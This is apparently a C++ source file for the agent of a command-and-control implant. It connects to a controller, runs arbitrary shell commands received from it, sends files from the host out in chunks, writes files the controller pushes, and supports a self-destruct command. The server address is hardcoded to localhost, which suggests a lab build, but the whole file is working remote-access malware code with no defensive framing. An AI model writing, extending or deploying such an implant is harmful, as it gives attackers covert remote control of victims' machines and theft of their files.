#include <stdexcept>
#include <iostream>
#include <fstream>
#include <chell/common/stdio.hpp>
#include <chell/common/agent.hpp>
#include <aperture_protos/commands.pb.h>
#include <aperture_protos/chunked_transfer.pb.h>


using namespace chell;
using namespace aperture_protos;
using namespace aperture_protos::chunked_transfer;


Agent::Agent() : m_connection(nullptr), wasDestroyed(false)
{
}

Agent::~Agent()
{
}

void Agent::run(const std::string& ip, int port)
{
    c2Connect("127.0.0.1", 0x3333);
    while (!wasDestroyed)
    {
        auto request = recvCommandRequest();
        auto response = processCommandRequest(request);
        sendCommandResponse(response);
    }
    c2Disconnect();
}

void Agent::c2Connect(const std::string& ip, int port)
{
	m_connection.reset(new network::ProtobufConnection(ip, port));
}

void Agent::c2Disconnect()
{
	m_connection.reset(nullptr);
}

commands::Request Agent::recvCommandRequest()
{
	if (!m_connection) {
		throw std::runtime_error("Agent is not connected to a server.");
	}
	return m_connection->recvProtobuf<commands::Request>();
}

void Agent::sendCommandResponse(commands::Response& response)
{
    if (!m_connection) {
        throw std::runtime_error("Agent is not connected to a server.");
    }
    m_connection->sendProtobuf(response);
}

commands::Response Agent::processCommandRequest(commands::Request &request)
{
    commands::Response response;
    switch (request.request_case()) {

    // Self destruct command handler
    case commands::Request::kSelfDestroy: {
        response.mutable_self_destroy();
        handleSelfDestroy();
        break;
    }

    // Health check command handler
    case commands::Request::kHealthCheck: {
        response.mutable_health_check();
        break;
    }

    // Command execution handler
    case commands::Request::kExecute: {
        auto output = handleExecute(request.execute().command());
        response.mutable_execute()->set_output(output);
        break;
    }

    // Get file handler
    case commands::Request::kGetFile: {
        handleGetFile(request.get_file().path(), request.get_file().suggested_chunk_size());
        response.mutable_get_file();
        break;
    }

    // Put file handler
    case commands::Request::kPutFile: {
        handlePutFile(request.put_file().path());
        response.mutable_put_file();
        break;
    }

    case commands::Request::REQUEST_NOT_SET:
    default:
        throw std::runtime_error("Request type not set.");
    }

    return response;
}

std::string Agent::handleExecute(const std::string &command)
{
    std::array<char, 128> buffer;
    std::string result;
    auto pipe = popen(command.c_str(), "r");
    if (!pipe) {
        return "Error: Failed to open pipe for command execution.";
    }
    while (fgets(buffer.data(), buffer.size(), pipe) != nullptr) {
        result += buffer.data();
    }
    pclose(pipe);
    return result;
}

void Agent::handleSelfDestroy()
{
    wasDestroyed = true;
}

void Agent::handleGetFile(const std::string& path, std::uint32_t suggestedChunkSize)
{
    std::vector<char> buffer(suggestedChunkSize);
    std::ifstream file(path, std::ios::binary);
    ChunkedTransferPacket packet;

    if (!file.is_open()) {
        throw std::runtime_error("Could not open file: " + path);
    }
    while (file) {
        file.read(buffer.data(), suggestedChunkSize);
        std::streamsize bytesRead = file.gcount();
        if (bytesRead > 0) {
            packet.set_chunk(buffer.data(), bytesRead);
            packet.set_is_last(false);
            m_connection->sendProtobuf<ChunkedTransferPacket>(packet);
        }
    }
    packet.set_chunk(buffer.data(), 0);
    packet.set_is_last(true);
    m_connection->sendProtobuf<ChunkedTransferPacket>(packet);
}

void Agent::handlePutFile(const std::string& path)
{
    ChunkedTransferPacket packet;
    std::ofstream file(path, std::ios::binary);
    std::string chunk;
    if (!file.is_open()) {
        throw std::runtime_error("Could not open file: " + path);
    }
    do {
        packet = m_connection->recvProtobuf<ChunkedTransferPacket>();
        chunk = packet.chunk();
        if (!chunk.empty()) {
            file.write(chunk.data(), chunk.size());
        }
    } while (!packet.is_last());
}
